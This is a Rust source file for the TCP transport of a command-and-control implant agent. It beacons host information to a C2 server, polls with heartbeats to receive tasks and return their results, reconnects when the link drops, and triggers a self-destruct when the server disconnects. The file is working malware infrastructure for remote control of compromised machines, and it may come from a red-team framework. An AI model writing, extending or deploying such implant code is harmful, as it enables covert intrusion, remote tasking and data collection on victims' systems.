use tokio::net::TcpStream;
use tokio_util::codec::{FramedRead, FramedWrite};
use futures::{SinkExt, StreamExt};
use std::time::Duration;

use crate::communication::codec::JsonCodec;
use crate::communication::message::{AgentMessage, ServerMessage};
use crate::post::commands::AgentCommand;
use crate::utils::logger::Logger;
use crate::communication::comm::channel::CommChannel;



pub struct TcpCommChannel {
    pub address: String,
    pub retries: u64,
    pub timeout: u64
}

#[async_trait::async_trait]
impl CommChannel for TcpCommChannel {
    async fn initial_beacon(&self, logger: &Logger, key: &Vec<u8>,
    ) -> (u64, String) {
        let beacon = match crate::communication::comm::channel::get_info(key).await {
            Ok(beacon) => beacon,
            Err(e) => {
                logger.error(&format!("[-] Failed to get host info: {:?}", e));
                return (0, "NONE".to_string());
            }
        };
    
        for attempt in 1..=self.retries {
            println!("[*] Attempting beacon (attempt {}/{})", attempt, self.retries);
            match send_message(&self.address, beacon.clone(), self.timeout).await {
                Ok(Some(ServerMessage::Ack {
                    agent_id,
                    status,
                    session_id,
                })) => {
                    logger.log(&format!("[*] Received Ack from server (status: {})", status));
                    return (agent_id, session_id);
                }
                Ok(Some(msg)) => {
                    logger.error(&format!("[!] Unexpected message: {:?}", msg));
                    return (0, "NONE".to_string());
                }
                Err(e) => {
                    logger.error(&format!("[!] Beacon attempt failed: {}", e));
                }
                _ => {}
            }
        }
    
        logger.log(&format!("[!] No Ack received after {} attempts. Operating offline.", self.retries));
        (0, "NONE".to_string())
    }

    async fn heartbeat(&self, agent_id: u64, session_id: &str, 
        result: Option<Vec<String>>, logger: &Logger
    ) -> Option<Vec<AgentCommand>> {
        let heartbeat = AgentMessage::Heartbeat { 
            agent_id, 
            session_id: session_id.to_string(), 
            result 
        };
    
        match send_message(&self.address, heartbeat, self.timeout).await {
            Ok(Some(ServerMessage::Noop { 
                agent_id: _, 
                session_id: _ 
            })) => {
                logger.log("[*] Received NOOP from C2");
                return Some(vec![AgentCommand::NOOP])
            }
            Ok(Some(ServerMessage::Task { 
                agent_id: _, 
                session_id: _, 
                command 
            })) => {
                logger.log("[*] Received tasks from C2");
                return Some(command)
            }
            Ok(Some(ServerMessage::Disconnect { 
                agent_id:_, 
                session_id:_ 
            })) => {
                logger.log("[*] Received disconnect from C2");
                return Some(vec![AgentCommand::SelfDestruct])
            }
            Ok(Some(msg)) => {
                logger.error(&format!("[!] Unexpected message: {:?}", msg));
                return Some(vec![AgentCommand::InvalidTask])
            }
            Err(e) => {
                logger.error(&format!("[!] Beacon attempt failed: {}", e));
            }
            _ => {}
        }
    
        return None
    }

    async fn reconnect(
        &self, agent_id: u64, session_id: &str, logger: &Logger,
    ) -> (u64, String) {
        let reconnect = AgentMessage::Reconnect {
            agent_id,
            session_id: session_id.to_string()
          };
    
        match send_message(&self.address, reconnect.clone(), self.timeout).await {
            Ok(Some(ServerMessage::Ack {
                agent_id,
                status,
                session_id,
            })) => {
                logger.log(&format!("[*] Received Ack from server (status: {})", status));
                return (agent_id, session_id);
            }
            Ok(Some(msg)) => {
                logger.error(&format!("[!] Unexpected message: {:?}", msg));
                return (0, "NONE".to_string());
            }
            Err(e) => {
                logger.error(&format!("[!] Reconnect attempt failed: {}", e));
            }
            _ => {}
        }
    
    
        logger.error("[!] Failed to reconnect. Continuing to operate offline.");
        (0, "NONE".to_string())
    }
}

/// Attempts to establish a TCP connection to the specified address asynchronously,
/// returning a `TcpStream` on success. If the connection fails, returns an error
/// with a formatted message describing the failure reason.
async fn send_message(addr: &str, message: AgentMessage, timeout_secs: u64) -> Result<Option<ServerMessage>, String> {
    println!("[*] Connecting to {}", addr);

    
    let stream = TcpStream::connect(addr).await.map_err(|e| format!("Connect failed: {}", e))?;
    let (read_half, write_half) = stream.into_split();
    let mut framed_rx = FramedRead::new(read_half, JsonCodec::<ServerMessage>::new());
    let mut framed_tx = FramedWrite::new(write_half, JsonCodec::<AgentMessage>::new());

    println!("[*] Sending message: {:?}", message);
    
    framed_tx.send(message).await.map_err(|e| format!("Send failed: {}", e))?;


    match tokio::time::timeout(Duration::from_secs(timeout_secs), framed_rx.next()).await {
        Ok(Some(Ok(msg))) => Ok(Some(msg)),
        Ok(Some(Err(e))) => Err(format!("Receive error: {:?}", e)),
        Ok(None) => Err("Connection closed by server".into()),
        Err(_) => Err("Timeout waiting for response".into()),
    }

}
